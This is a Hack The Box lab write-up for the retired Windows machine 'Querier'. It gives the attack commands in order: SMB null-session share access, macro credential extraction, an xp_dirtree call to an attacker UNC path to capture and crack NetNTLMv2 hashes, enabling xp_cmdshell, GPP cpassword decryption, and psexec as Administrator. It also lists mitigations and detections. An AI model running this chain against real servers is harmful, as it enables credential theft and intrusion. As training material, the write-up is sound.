---
machine: Querier
os: Windows
difficulty: Medium
platform: Hack The Box
category: Windows / MSSQL
state: Retired
tags: [windows, smb, mssql, xp_dirtree, responder, ntlmv2, gpp, cpassword, psexec]
---

# Querier — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology note; no real flags or credentials.

## TL;DR

A standalone server with SMB, MSSQL 2017 and WinRM, no domain controller. An SMB null session reads the `Reports` share, whose `.xlsm` macro stores `reporting`'s connection string. That account logs into SQL with Windows authentication but cannot use `xp_cmdshell`; it can, however, call `xp_dirtree` against an attacker UNC path, forcing the service to authenticate as `mssql-svc` and handing over a NetNTLMv2 that falls to a dictionary. With `mssql-svc`, a `sysadmin`, `xp_cmdshell` is enabled and PowerUp finds a cached `Groups.xml` with a decryptable `Administrator` password.

## Recon

```bash
nmap -p- --min-rate 5000 -oA nmap_all <IP>
nmap -p 135,139,445,1433,5985 -sCV -oA nmap_svc <IP>
```

```text
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 14.00.1000.00
5985/tcp open  wsman
| ms-sql-ntlm-info:
|   NetBIOS_Computer_Name: QUERIER
|_  DNS_Domain_Name: HTB.LOCAL
```

- No 88, 389 or 53: this is a member or standalone server, not a DC. That shapes the final escalation.
- SMB signing is enabled but not required.
- SQL Server 2017 RTM on Windows Server 2019 (build 17763).

```bash
printf '%s\n' '<IP> querier.htb' | sudo tee -a /etc/hosts
```

## Enumeration

```bash
smbclient -N -L //<IP>
smbclient -N //<IP>/Reports
smb: \> get "Currency Volume Report.xlsm"
olevba "Currency Volume Report.xlsm"
```

The macro contains a connection string with plaintext credentials:

```vb
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;" & _
  "Database=volume;Uid=reporting;Pwd=<PASSWORD>"
```

There is no need to open the document in Excel: the value is stored in the file and `olevba` extracts it statically. `reporting` is a local Windows account mapped into SQL, so Windows authentication is required:

```bash
mssqlclient.py -windows-auth 'reporting:<PASSWORD>@<IP>'
```

## Foothold

```sql
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
```

`reporting` is not `sysadmin` and cannot enable or run `xp_cmdshell`. What it can do is ask SQL Server to list a UNC path, which turns the service into an SMB client authenticating with its own service account:

```sql
EXEC master..xp_dirtree '\\<LHOST>\share';
```

With Responder listening, the NetNTLMv2 of `QUERIER\mssql-svc` is captured:

```text
[SMBv2] NTLMv2-SSP Username : QUERIER\mssql-svc
```

```bash
hashcat -m 5600 mssql-svc.txt /usr/share/wordlists/rockyou.txt
# <PASSWORD>
```

`mssql-svc` is `sysadmin`. Command execution is enabled with the standard procedure:

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

```text
querier\mssql-svc
```

## Lateral movement

There is no forest and no second host: movement is vertical inside the same server, from `reporting` (unprivileged) to `mssql-svc` (service) and from there to `Administrator`.

## Privilege escalation

With a shell as `mssql-svc`, PowerUp's `Invoke-AllChecks` returns a cached GPP file on local disk:

```text
File      : C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-...}\Machine\Preferences\Groups\Groups.xml
UserNames : {Administrator}
Passwords : {<PASSWORD>}
```

The password is the `cpassword` attribute, encrypted with the public AES key Microsoft published and which `gpp-decrypt` reverses:

```bash
gpp-decrypt <CPASSWORD>
```

That password opens a session as the local administrator:

```bash
psexec.py 'Administrator:<PASSWORD>@querier.htb'    # nt authority\system
# or wmiexec/evil-winrm for remote\administrator
```

Why it works: MS14-025 stops **new** passwords from being stored in GPP but does not delete old `Groups.xml` files; the cached copy under `ProgramData` keeps the `cpassword`, and the decryption key has been public since 2014.

`mssql-svc` held `SeImpersonatePrivilege`, but that is not the path: the host is patched against the Rotten/Juicy Potato family. The documented route is the GPP file.

## Evidence

- `smbclient -N -L` with the readable `Reports` share.
- The macro connection string with the password redacted.
- `xp_dirtree` output and the captured hash, truncated.
- `IS_SRVROLEMEMBER` before and after cracking.
- `Groups.xml` with the `cpassword` truncated.

## Lessons learned

- A database account may not be a SQL login: `--windows-auth` makes the difference.
- `xp_dirtree` does not execute commands, but it forces the service to authenticate outbound; that is the flaw.
- A read-only share with documentation is still attack surface: macros store secrets in clear.
- MS14-025 is a misnomer here: the server is not affected by the CVE, this is leftover data.
- `SeImpersonatePrivilege` guarantees nothing on 2019; check patches before firing a Potato.

## Mitigations and detection

- Disable SMB null sessions and restrict `Reports` to the groups that need it.
- Keep credentials out of macros and shared documents; rotate the `reporting` account.
- Prevent service accounts from logging on interactively and limit `xp_dirtree`/`xp_fileexist` to what is needed; disable `xp_cmdshell`.
- Purge historical GPP `cpassword` values from `SYSVOL` and local caches, and rotate the affected passwords.
- Detection: null sessions and reads of the `Reports` share (5140/5145); `xp_dirtree` with an external UNC in the SQL log; outbound SMB authentications from the MSSQL service (4624 type 3); `xp_cmdshell` execution (4104/4688); service creation by `psexec` (7045).

MITRE: T1552.001, T1187, T1110.002, T1078.003, T1059.003, T1552.006, T1021.002, T1021.006.

## References

- <https://0xdf.gitlab.io/2019/06/22/htb-querier.html>
- <https://0xrick.github.io/hack-the-box/querier>
- <https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option>
- <https://learn.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-025>
- <https://attack.mitre.org/techniques/T1552/006/>
